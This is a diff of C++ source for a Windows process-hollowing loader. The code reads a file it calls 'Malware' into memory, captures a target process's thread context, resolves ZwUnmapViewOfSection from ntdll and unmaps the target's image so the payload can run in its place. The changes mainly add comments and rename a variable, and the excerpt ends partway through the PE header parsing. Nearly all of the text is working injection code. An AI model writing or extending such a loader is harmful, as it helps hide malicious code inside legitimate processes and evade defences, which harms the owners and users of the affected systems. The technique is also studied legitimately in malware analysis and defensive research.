@@ -61,7 +61,7 @@ int main() {
 	std::cout << "[+] Malware file size: " << malwareFileSize << " bytes." << std::endl;
 
 
-	//Allocating memory for Malware
+	//Dynamically allocates memory for Malware.
 	PVOID pMalwareImage = VirtualAlloc(
 		NULL,
 		malwareFileSize,
@@ -70,28 +70,30 @@ int main() {
 	);
 
 
-	DWORD numberOfBytesRead;
+	//Will store num of bytes read from ReadFile().
+	DWORD numBytesRead;
 
 
-	//Writes Malware into allocated memory
+	//Writes Malware into allocated memory using handle from createProcessA() and writing to
+	//the new memory allocation using the pointer from virtualAlloc().
 	if (!ReadFile(
 		hMalware,
 		pMalwareImage,
 		malwareFileSize,
-		&numberOfBytesRead,
-		NULL
-	)) {
+		&numBytesRead,
+		NULL)) {
 		std::cout << "[!] Unable to read. Error: " << GetLastError() << std::endl;
 		TerminateProcess(processInfo->hProcess, 0);
 		return 1;
 	}
 
 
+	//Close open Malware object handle.
 	CloseHandle(hMalware);
 	std::cout << "[+] Wrote Malware into memory at: 0x" << pMalwareImage << std::endl;
 
 
-	//Using context structure pointer c, pull thread context for target process.
+	//Using context structure pointer c to pull thread context for target process.
 	c.ContextFlags = CONTEXT_INTEGER;
 	GetThreadContext(processInfo->hThread, &c);
 
@@ -108,11 +110,12 @@ int main() {
 	std::cout << "[+] Target Base Address : 0x" << pTargetBaseAddress << std::endl;
 
 
-	//Hollow process 
+	//Get handle of ntdll.dll and use to get address of ZwUnmapViewOfSection
 	HMODULE hDllBase = GetModuleHandleA("ntdll.dll");
 	pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(hDllBase, "ZwUnmapViewOfSection");
 
 
+	//Free memory in target process to allow for writing of Malware in its place.
 	DWORD result = pZwUnmapViewOfSection(processInfo->hProcess, pTargetBaseAddress);
 	if (result) {
 		std::cout << "[!] Unmap failed." << std::endl;
@@ -122,7 +125,7 @@ int main() {
 
 	std::cout << "[+] Process hollowed at Base: 0x" << pTargetBaseAddress << std::endl;
 
-
+	//*******************************************************************8
 	//get Malware size from NT Headers
 	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMalwareImage;
 	PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMalwareImage + pDOSHeader->e_lfanew);
